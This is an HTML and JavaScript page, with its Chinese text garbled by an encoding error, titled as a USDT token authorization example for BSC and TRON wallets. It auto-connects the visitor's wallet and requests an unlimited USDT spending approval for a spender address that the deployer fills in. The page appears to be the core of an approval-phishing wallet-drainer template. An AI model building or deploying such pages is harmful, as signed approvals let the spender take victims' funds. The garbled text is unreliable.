<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT æˆæƒç¤ºä¾‹ (å·²ä¿®å¤)</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
            text-align: center;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            color: white;
            background-color: #007bff;
            transition: background-color 0.3s;
        }
        button:hover:not(:disabled) {
            background-color: #0056b3;
        }
        button:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            min-height: 40px;
            font-weight: bold;
            word-wrap: break-word;
        }
        .connected {
            background-color: #e6ffe6;
            color: #008000;
        }
        .error {
            background-color: #ffe6e6;
            color: #cc0000;
        }
        .warning {
            color: orange;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>USDT ä»£å¸æˆæƒç¤ºä¾‹ (å·²ä¿®å¤)</h1>
    
    <div id="status" class="status">æœªè¿æ¥é’±åŒ…</div>
    
    <button onclick="connectWallet()">è¿æ¥é’±åŒ… (BSC/TRON)</button>
    <button id="approve-button" onclick="approveToken()" disabled>æˆæƒ USDT</button>

    <p style="margin-top: 30px;">
        <strong class="warning">--- ğŸš¨ æ›¿æ¢è­¦å‘Š ğŸš¨ ---</strong>
        <br>
        <strong>æ‚¨å¿…é¡»æ›¿æ¢ä»¥ä¸‹ä»£ç ä¸­çš„ `YOUR_BSC_SPENDER_ADDRESS` å’Œ `YOUR_TRON_SPENDER_ADDRESS` ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ï¼</strong>
    </p>
</div>

<script>
    // --- é…ç½®: USDT ä»£å¸å’Œ Spender åœ°å€ ---
    const BSC_TOKEN_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
    const TRON_TOKEN_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 

    // ğŸš¨ å¿…é¡»æ›¿æ¢ä¸ºæ‚¨çš„ç›®æ ‡åˆçº¦åœ°å€ (Spender) ğŸš¨
    const BSC_SPENDER_ADDRESS = 'YOUR_BSC_SPENDER_ADDRESS';
    const TRON_SPENDER_ADDRESS = 'YOUR_TRON_SPENDER_ADDRESS';

    // æˆæƒé‡‘é¢ (ä½¿ç”¨ uint256 çš„æœ€å¤§å€¼ï¼Œä»£è¡¨ "æ— é™" æˆæƒ)
    const MAX_APPROVAL_AMOUNT = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    let currentNetwork = null;
    let currentAccount = null;
    let web3 = null;

    // --- çŠ¶æ€æ›´æ–°å‡½æ•° ---
    function updateStatus(message, type = 'connected') {
        const statusDiv = document.getElementById('status');
        statusDiv.textContent = message;
        statusDiv.className = `status ${type}`; // 'connected', 'error'
        document.getElementById('approve-button').disabled = !currentAccount;
    }

    // --- è¿æ¥é’±åŒ… (ä¸»å…¥å£) ---
    async function connectWallet() {
        // ä¼˜å…ˆæ£€æµ‹ TronLink
        if (window.tronWeb) {
            currentNetwork = 'TRON';
            await connectTron();
        } 
        // å…¶æ¬¡æ£€æµ‹ EVM é’±åŒ… (MetaMask)
        else if (window.ethereum) {
            currentNetwork = 'BSC';
            await connectEVM();
        } 
        // éƒ½æ²¡æœ‰æ‰¾åˆ°
        else {
            resetState();
            updateStatus('æœªæ£€æµ‹åˆ°å…¼å®¹çš„é’±åŒ…æ’ä»¶ (å¦‚ TronLink æˆ– MetaMask)ã€‚', 'error');
        }
    }

    // --- EVM (BSC) è¿æ¥é€»è¾‘ ---
    async function connectEVM() {
        try {
            web3 = new Web3(window.ethereum);
            updateStatus('æ­£åœ¨è¯·æ±‚è¿æ¥ BSC é’±åŒ…...');
            
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            currentAccount = accounts[0];
            
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            // ä¿®æ­£: BSC ä¸»ç½‘çš„ Chain ID æ˜¯ '0x38' (åå…­è¿›åˆ¶)
            if (chainId !== '0x38') {
                resetState();
                updateStatus(`è¯·å°†é’±åŒ…ç½‘ç»œåˆ‡æ¢åˆ°å¸å®‰æ™ºèƒ½é“¾ (BSC) ä¸»ç½‘ã€‚å½“å‰ç½‘ç»œ ID: ${chainId}`, 'error');
                return;
            }

            currentNetwork = 'BSC';
            updateStatus(`å·²è¿æ¥ BSC: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
        } catch (error) {
            resetState();
            updateStatus(`BSC é’±åŒ…è¿æ¥å¤±è´¥: ${error.message}`, 'error');
        }
    }

    // --- TRON è¿æ¥é€»è¾‘ ---
    async function connectTron() {
        try {
            updateStatus('æ­£åœ¨ç­‰å¾… TRON é’±åŒ…å°±ç»ª...');

            // ä¼˜åŒ–: ç­‰å¾… TronLink æ³¨å…¥å®Œæˆ
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200) {
                 if (!window.tronWeb.ready) {
                     throw new Error("TronLink é’±åŒ…å·²è¿æ¥ä½†æœªå°±ç»ªï¼Œè¯·è§£é”æˆ–åˆ·æ–°é¡µé¢ã€‚");
                 }
                currentAccount = window.tronWeb.defaultAddress.base58;
                if (!currentAccount) {
                    throw new Error("æœªèƒ½è·å–åˆ° TRON è´¦æˆ·åœ°å€ï¼Œè¯·è§£é” TronLinkã€‚");
                }
                currentNetwork = 'TRON';
                updateStatus(`å·²è¿æ¥ TRON: ${currentAccount.substring(0, 6)}...${currentAccount.slice(-4)}`);
            } else {
                 throw new Error("TRON è´¦æˆ·è¯·æ±‚è¢«æ‹’ç»ã€‚");
            }
        } catch (error) {
            resetState();
            updateStatus(`TRON é’±åŒ…è¿æ¥å¤±è´¥: ${error.message}`, 'error');
        }
    }

    // --- é‡ç½®çŠ¶æ€ ---
    function resetState() {
        currentAccount = null;
        currentNetwork = null;
        document.getElementById('approve-button').disabled = true;
    }

    // --- æˆæƒé€»è¾‘åˆ†å‘å™¨ ---
    async function approveToken() {
        if (!currentAccount) {
            updateStatus('è¯·å…ˆè¿æ¥é’±åŒ…ï¼', 'error');
            return;
        }

        if (currentNetwork === 'BSC') {
            await approveBSCToken();
        } else if (currentNetwork === 'TRON') {
            await approveTRONToken();
        }
    }

    // --- BSC (EVM) æˆæƒå®ç° ---
    async function approveBSCToken() {
        if (BSC_SPENDER_ADDRESS === 'YOUR_BSC_SPENDER_ADDRESS') {
             updateStatus('é”™è¯¯ï¼šè¯·åœ¨ä»£ç ä¸­æ›¿æ¢ BSC_SPENDER_ADDRESSï¼', 'error');
             return;
        }
        
        updateStatus('æ­£åœ¨è¯·æ±‚ BSC (USDT) ä»£å¸æˆæƒ...');

        const abi = [{"constant": false, "inputs": [{"name": "spender", "type": "address"}, {"name": "amount", "type": "uint256"}], "name": "approve", "outputs": [{"name": "", "type": "bool"}], "type": "function"}];
        const tokenContract = new web3.eth.Contract(abi, BSC_TOKEN_ADDRESS);
        
        try {
            const transaction = await tokenContract.methods.approve(BSC_SPENDER_ADDRESS, MAX_APPROVAL_AMOUNT).send({ from: currentAccount });
            
            // ä¿®æ­£: web3è¿”å›çš„å¯¹è±¡åŒ…å« transactionHash å­—æ®µ
            updateStatus(`BSC æˆæƒæˆåŠŸï¼äº¤æ˜“å“ˆå¸Œ: ${transaction.transactionHash.substring(0, 10)}...`);
            alert('BSC USDT æˆæƒæˆåŠŸï¼');
        } catch (error) {
            if (error.code === 4001) {
                updateStatus('ç”¨æˆ·æ‹’ç»äº† BSC æˆæƒè¯·æ±‚ã€‚', 'error');
            } else {
                updateStatus(`BSC æˆæƒå¤±è´¥: ${error.message}`, 'error');
            }
        }
    }

    // --- TRON æˆæƒå®ç° ---
    async function approveTRONToken() {
        if (TRON_SPENDER_ADDRESS === 'YOUR_TRON_SPENDER_ADDRESS') {
             updateStatus('é”™è¯¯ï¼šè¯·åœ¨ä»£ç ä¸­æ›¿æ¢ TRON_SPENDER_ADDRESSï¼', 'error');
             return;
        }
        
        updateStatus('æ­£åœ¨è¯·æ±‚ TRON (USDT) ä»£å¸æˆæƒ...');
        
        try {
            const contract = await window.tronWeb.contract().at(TRON_TOKEN_ADDRESS);
            
            // ä¿®æ­£: tronWeb çš„ send() ç›´æ¥è¿”å›äº¤æ˜“å“ˆå¸Œå­—ç¬¦ä¸² (txID)
            const txID = await contract.approve(TRON_SPENDER_ADDRESS, MAX_APPROVAL_AMOUNT).send({
                feeLimit: 150000000, // å¢åŠ æ‰‹ç»­è´¹é™åˆ¶
                callValue: 0
            });

            if (txID) {
                updateStatus(`TRON æˆæƒäº¤æ˜“å·²å‘é€ï¼äº¤æ˜“å“ˆå¸Œ: ${txID.substring(0, 10)}...`);
                alert('TRON æˆæƒè¯·æ±‚å·²å‘é€ï¼Œè¯·åœ¨é’±åŒ…ä¸­ç¡®è®¤ï¼');
            } else {
                 throw new Error("TronWeb æœªè¿”å›äº¤æ˜“IDã€‚");
            }
            
        } catch (error) {
            const errorMessage = typeof error === 'string' ? error : error.message;
            if (errorMessage.includes('User denied') || errorMessage.includes('User cancelled')) {
                updateStatus('ç”¨æˆ·æ‹’ç»äº† TRON æˆæƒè¯·æ±‚ã€‚', 'error');
            } else {
                updateStatus(`TRON æˆæƒå¤±è´¥: ${errorMessage}`, 'error');
            }
        }
    }

    // --- äº‹ä»¶ç›‘å¬ ---
    function setupEventListeners() {
        // ç›‘å¬ EVM é’±åŒ… (MetaMask) çš„å˜åŒ–
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                console.log('EVM account changed.');
                if (accounts.length === 0) {
                    resetState();
                    updateStatus('é’±åŒ…å·²æ–­å¼€è¿æ¥ã€‚', 'error');
                } else {
                    connectWallet();
                }
            });
            window.ethereum.on('chainChanged', () => {
                console.log('EVM network changed.');
                connectWallet();
            });
        }

        // ä¼˜åŒ–: å¢åŠ å¯¹ TRON é’±åŒ… (TronLink) å˜åŒ–çš„ç›‘å¬
        if(window.tronWeb) {
            window.addEventListener('message', (e) => {
                if (e.data.message && e.data.message.action) {
                    const { action, data } = e.data.message;
                    // è´¦æˆ·åˆ‡æ¢æˆ–ç½‘ç»œåˆ‡æ¢æ—¶é‡æ–°è¿æ¥
                    if (action === 'setAccount' || action === 'setNode') {
                         console.log(`TronLink event: ${action}`);
                         connectWallet();
                    }
                }
            });
        }
    }

    // é¡µé¢åŠ è½½å®Œæˆåè‡ªåŠ¨å°è¯•è¿æ¥å¹¶è®¾ç½®ç›‘å¬å™¨
    window.addEventListener('load', () => {
        setupEventListeners();
        // å»¶è¿Ÿä¸€å°æ®µæ—¶é—´å†è¿æ¥ï¼Œç¡®ä¿é’±åŒ…æ’ä»¶å®Œå…¨æ³¨å…¥
        setTimeout(connectWallet, 500);
    });
</script>
</body>
</html>